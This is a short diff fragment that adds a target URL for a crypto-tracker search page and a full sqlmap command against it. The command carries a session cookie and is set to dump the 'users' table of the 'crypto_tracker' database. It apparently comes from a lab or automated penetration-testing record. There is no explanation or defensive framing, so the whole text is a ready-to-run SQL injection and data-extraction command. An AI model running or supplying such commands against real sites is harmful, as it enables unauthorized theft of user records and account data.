@@ -1,0 +1,2 @@
+http://web/crypto-tracker/search.php?q=BTC (GET)  # /usr/local/bin/sqlmap -u http://web/crypto-tracker/search.php?q=BTC --cookie=PHPSESSID=
+b8c1f6b46a415ae36f262d068c9254ef --output-dir=/output --batch --dump -T users -D crypto_tracker
